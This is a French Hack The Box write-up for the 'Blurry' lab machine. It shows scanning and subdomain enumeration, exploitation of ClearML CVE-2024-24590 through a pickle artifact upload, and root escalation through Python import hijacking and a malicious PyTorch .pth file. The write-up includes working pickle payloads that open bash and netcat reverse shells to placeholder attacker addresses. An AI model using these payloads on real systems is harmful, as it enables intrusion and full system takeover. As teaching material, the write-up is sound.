<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Blurry</title>
<meta name=description content="Platforme: Hack The Box Lien: Blurry Niveau: Moyen OS: Linux Lire cet article en anglais
La machine Blurry démontre comment les modules Python et les …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-blurry/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Blurry"><meta property="og:description" content="Platforme: Hack The Box Lien: Blurry Niveau: Moyen OS: Linux Lire cet article en anglais
La machine Blurry démontre comment les modules Python et les …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Blurry/Blurry.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Blurry/Blurry.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Blurry"><meta name=twitter:description content="Platforme: Hack The Box Lien: Blurry Niveau: Moyen OS: Linux Lire cet article en anglais
La machine Blurry démontre comment les modules Python et les …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-blurry/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-blurry/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Blurry/Blurry.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-blurry/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-blurry/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Blurry</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>10 Octobre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Blurry>Blurry</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-blurry/>Lire cet article en anglais</a></p><p>La machine Blurry démontre comment les modules Python et les fonctionnalités spécifiques de Python peuvent être exploités pour compromettre des systèmes. Le défi commence par l&rsquo;accès à une instance ClearML, contenant diverses expériences liées à un projet. En utilisant le <code>CVE-2024-24590</code>, nous obtenons notre accès initial en téléchargeant un artefact malveillant via l&rsquo;API sur la cible, ce qui nous permet de récupérer le drapeau utilisateur (user.txt). Cet article présentera deux méthodes distinctes d&rsquo;escalade des privilèges, illustrant différentes approches pour compromettre complètement le système.</p><p>Addresse IP cible - <code>10.10.11.19</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.19 Blurry
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-10 19:38 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.19
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.061s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://app.blurry.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 12.40 seconds
</span></span></code></pre></div><p>Notre scan nmap découvre deux ports ouverts 22 (SSH) et 80 (HTTP). Nous notons également une redirection vers <code>app.blurry.htb</code>, à laquelle nous accéderons après mise à jour de notre fichier hosts.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.19 blurry.htb app.blurry.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Sur <code>http://app.blurry.htb/</code> nous trouvons une instance ClearML à laquelle nous pouvons nous connecter avec le nom d&rsquo;utilisateur <code>Chad Jippity</code>. Sur la page Github, nous lisons que cette solution est utilisée à différentes fins telles que le machine learning, le MLOps, l&rsquo;automatisation, etc.
<em><a href=https://github.com/allegroai/clearml>Source</a></em></p><p><img src=/images/HTB-Blurry/ClearML_website.png alt="ClearML website"></p><p>Nous ne trouvons rien qui sorte de l&rsquo;ordinaire sur le site web. L&rsquo;énumération des sous-domaines nous permet d&rsquo;obtenir deux autres résultats: <code>files</code> et <code>chat</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blurry.htb -H &#34;Host: FUZZ.blurry.htb&#34; -ic -fs 169
</code></pre><p><img src=/images/HTB-Blurry/blurry_ffuf.png alt="Blurry subdomain enumeration"></p><p>En entrant dans le projet <code>Black Swan</code>, nous trouvons différentes tâches sous <code>Experiments</code>.</p><p><img src=/images/HTB-Blurry/blurry_experiments.png alt="Blurry Experiments section"></p><p>Un clic droit sur l&rsquo;un des jobs et la sélection de <code>Details</code> montre qu&rsquo;il y a un script qui gère les tâches (<code>review_tasks.py</code>) dans l&rsquo;image ci-dessous.</p><p><img src=/images/HTB-Blurry/experiment_details.png alt="Blurry Experiments details"></p><p>Des recherches nous permettent de découvrir plusieurs vulnérabilités liées à ClearML, détaillées <a href=https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/>ici</a>.</p><p>Sous la section de l&rsquo;article <code>Manipulating the Platform to Work for us</code> nous obtenons du code pour exploiter ClearML avec le <code>CVE-2024-24590</code>. Nous devons créer un artefact malveillant et le télécharger sur la cible.</p><p><img src=/images/HTB-Blurry/malicious_artifact.png alt="Malicious artifact"></p><p><img src=/images/HTB-Blurry/malicious_artifact_upload.png alt="Malicious artifact upload"></p><h2 id=accès-initial>Accès Initial</h2><p>Tout d&rsquo;abord, connectons notre machine locale au serveur ClearML. Sous le projet <code>Black Swan</code>, cliquez sur <code>New experiment</code>.</p><p><img src=/images/HTB-Blurry/clearml_new_experiment.png alt="ClearML new experiment"></p><p>Un guide explique comment le configurer. Complétez la configuration comme demandé.</p><ol><li>Installez <code>clearml</code></li></ol><pre tabindex=0><code>pip install clearml
</code></pre><ol start=2><li>Exécutez la commande ci-dessous pour initialiser ClearML</li></ol><pre tabindex=0><code>clearml-init
</code></pre><ol start=3><li>Lorsque le message <code>Paste copied configuration here</code> apparaît, utilisez le code que vous avez généré après avoir cliqué sur <code>CREATE NEW CREDENTIALS</code>. Vous devez ajouter <code>api.blurry.htb</code> à votre fichier hosts autrement la configuration échouera.</li></ol><p><img src=/images/HTB-Blurry/clearml_config_steps.png alt="ClearML configuartion steps"></p><p>Si la configuration est réussie, vous serez informé par des messages sur le terminal.</p><p><img src=/images/HTB-Blurry/ClearML_success_config.png alt="ClearML successful configuration"></p><ol start=4><li>Nous pouvons maintenant télécharger un artefact malveillant afin d&rsquo;obtenir un reverse shell, après exécution du script ci-dessous, nous obtenons un shell sur notre listener en tant que <code>jippity</code> et trouvons le drapeau utilisateur dans <code>/home/jippity</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>pickle</span><span style=color:#56b6c2>,</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#e5c07b>RunCommand</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>__reduce__</span>(<span style=color:#e06c75>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> (<span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>system</span>, (<span style=color:#98c379>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#34;&#39;</span>,))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>command</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>RunCommand</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>clearml</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>Task</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>task</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>Task</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>init</span>(<span style=color:#e06c75>project_name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;Black Swan&#39;</span>, <span style=color:#e06c75>task_name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;pickle_artifact_upload&#39;</span>, <span style=color:#e06c75>tags</span><span style=color:#56b6c2>=</span>[<span style=color:#98c379>&#34;review&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#e06c75>task</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upload_artifact</span>(<span style=color:#e06c75>name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;pickle_artifact&#39;</span>, <span style=color:#e06c75>artifact_object</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>command</span>, <span style=color:#e06c75>retries</span><span style=color:#56b6c2>=</span><span style=color:#d19a66>2</span>, <span style=color:#e06c75>wait_on_upload</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>True</span>, <span style=color:#e06c75>extension_name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;.pkl&#34;</span>)
</span></span></code></pre></div><p><img src=/images/HTB-Blurry/blurry_user_flag.png alt="Blurry user flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Avec <code>sudo -l</code> nous apprenons que l&rsquo;utilisateur <code>jippity</code> a la permission de lancer la commande <code>evaluate_model</code> sur n&rsquo;importe quel fichier <code>.pth</code> dans le répertoire <code>/models</code> en tant que root sans fournir de mot de passe.</p><p><img src=/images/HTB-Blurry/sudo-l_cmd.png alt="Blurry sudo -l"></p><h3 id=python-import-hijacking-détournement-dimportation>Python Import hijacking (détournement d&rsquo;importation)</h3><p>Dans <code>/models</code> nous trouvons deux fichiers <code>demo_model.pth</code>, et <code>evaluate_model.py</code>. Le script utilise <code>import sys</code> qui &ldquo;fournit diverses fonctions et variables qui sont utilisées pour manipuler différentes parties de l&rsquo;environnement d&rsquo;exécution de Python.&rdquo;. <em><a href=https://www.geeksforgeeks.org/python-sys-module/>Source</a></em></p><p>Puisqu&rsquo;il n&rsquo;y a pas de spécifications liées au module, nous pourrions être en mesure de faire un détournement d&rsquo;importation sous python.</p><p><img src=/images/HTB-Blurry/evaluate_model_script.png alt="evaluate_model script import functions"></p><p>Nous commençons par créer un script malveillant <code>torch.py</code>.</p><pre tabindex=0><code>echo &#39;import os; os.system(&#34;bash&#34;)&#39; &gt; /models/torch.py
</code></pre><p><img src=/images/HTB-Blurry/malicious_torch_py.png alt="Malicious torch.py"></p><p>Ensuite, nous exécutons <code>evaluate_model</code> avec sudo.</p><pre tabindex=0><code>sudo /usr/bin/evaluate_model /models/demo_model.pth
</code></pre><p>Un shell root est créé, nous permettant de lire le drapeau root situé dans <code>/root</code>.</p><p><img src=/images/HTB-Blurry/blurry_root_flag.png alt="blurry root flag"></p><h4 id=explication-de-lexploitation>Explication de l&rsquo;exploitation</h4><p>Lorsqu&rsquo;un script Python importe un module (tel que <code>torch</code>), Python recherche le module à différents endroits, en commençant par le répertoire actuel (qui est <code>/models</code> dans notre cas). Puisque nous avons créé un fichier appelé <code>torch.py</code> dans le répertoire <code>/models</code>, Python importe notre script malveillant <code>torch.py</code> au lieu de la bibliothèque torch.</p><p>Après l&rsquo;importation, notre fichier est exécuté et puisque le script (<code>evaluate_model.py</code>) est exécuté en tant que sudo, nous obtenons un shell root.</p><h3 id=désérialisation-pickle>Désérialisation Pickle</h3><p>Nous pouvons également exploiter la cible via la désérialisation pickle. Utilisons un script python pour générer un fichier modèle malveillant.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>torch</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>torch.nn</span> <span style=color:#c678dd>as</span> <span style=color:#e06c75>nn</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>torch.nn.functional</span> <span style=color:#c678dd>as</span> <span style=color:#e06c75>F</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#e5c07b>CustomModel</span>(<span style=color:#e06c75>nn</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Module</span>):
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#56b6c2;font-weight:700>__init__</span>(<span style=color:#e06c75>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>super</span>(<span style=color:#e06c75>CustomModel</span>, <span style=color:#e06c75>self</span>)<span style=color:#56b6c2>.</span><span style=color:#56b6c2;font-weight:700>__init__</span>()
</span></span><span style=display:flex><span>        <span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>linear</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>nn</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>Linear</span>(<span style=color:#d19a66>512</span>, <span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>forward</span>(<span style=color:#e06c75>self</span>, <span style=color:#e06c75>x</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>linear</span>(<span style=color:#e06c75>x</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>__reduce__</span>(<span style=color:#e06c75>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> (<span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>system</span>, (<span style=color:#98c379>&#39;echo Going for $USER on $HOSTNAME at $(date);rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f&#39;</span>,))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>model</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>CustomModel</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>torch</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>save</span>(<span style=color:#e06c75>model</span>, <span style=color:#98c379>&#39;root.pth&#39;</span>)
</span></span></code></pre></div><p>Après l&rsquo;exécution du script (<code>root.py</code>), nous obtenons un fichier appelé <code>root.pth</code>.</p><p><img src=/images/HTB-Blurry/malicious_model_file.png alt="malicious model file"></p><p>L&rsquo;exécution de la commande <code>sudo /usr/bin/evaluate_model /models/root.pth</code> nous donne un shell root sur notre listener.</p><p><img src=/images/HTB-Blurry/root_shell.png alt="root shell"></p><h4 id=explication-de-lexploitation-1>Explication de l&rsquo;exploitation</h4><p>Nous profitons de l&rsquo;insécurité inhérente du module <code>pickle</code>. Lorsque <code>torch.save</code> est utilisé pour sauvegarder un modèle dans un fichier <code>.pth</code>, il s&rsquo;appuie sur le module <code>pickle</code> pour sérialiser l&rsquo;objet, et la méthode <code>__reduce__</code> (où nous plaçons notre commande malveillante) dicte ce qui se passe au cours de ce processus.</p><p><img src=/images/HTB-Blurry/pickle_module.png alt="pickle module">
<em><a href=https://docs.python.org/3/library/pickle.html>Source</a></em></p><p>Dans la classe <code>CustomModel</code>, la méthode <code>__reduce__</code> définit comment l&rsquo;objet est sérialisé lorsqu&rsquo;il est sauvegardé et comment il sera désérialisé lorsqu&rsquo;il sera chargé. Cette méthode contient également notre commande reverse shell. Lorsque <code>torch.save(model, 'root.pth')</code> est invoqué, le modèle est sérialisé, et durant ce processus, notre méthode <code>__reduce__</code> indique à pickle de stocker une commande qui sera exécutée lorsque le modèle sera désérialisé.</p><p>Lorsque nous exécutons sudo <code>/usr/bin/evaluate_model /models/root.pth</code>, le script <code>evaluate_model.py</code> tente de charger le modèle en utilisant <code>torch.load</code>. Cela désérialise le modèle et déclenche la méthode <code>__reduce__</code> dans notre classe <code>CustomModel</code>, ce qui amène Python à exécuter la commande malveillante (dans ce cas, notre reverse shell).</p><p>J&rsquo;ai pris beaucoup de plaisir à faire des recherches sur ces chemins d&rsquo;exploitation et j&rsquo;ai pu apprendre beaucoup de choses. Je vous remercie d&rsquo;avoir lu cet article et j&rsquo;espère qu&rsquo;il vous a été utile!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-freelancer/>&#8592;
Précédent:
HTB: Freelancer</a></p><p class=prev-post-date>septembre 30, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-editorial/>Suivant:
HTB: Editorial
&#8594;</a></p><p class=next-post-date>octobre 16, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#python-import-hijacking-détournement-dimportation>Python Import hijacking (détournement d&rsquo;importation)</a><ul><li><a href=#explication-de-lexploitation>Explication de l&rsquo;exploitation</a></li></ul></li><li><a href=#désérialisation-pickle>Désérialisation Pickle</a><ul><li><a href=#explication-de-lexploitation-1>Explication de l&rsquo;exploitation</a></li></ul></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>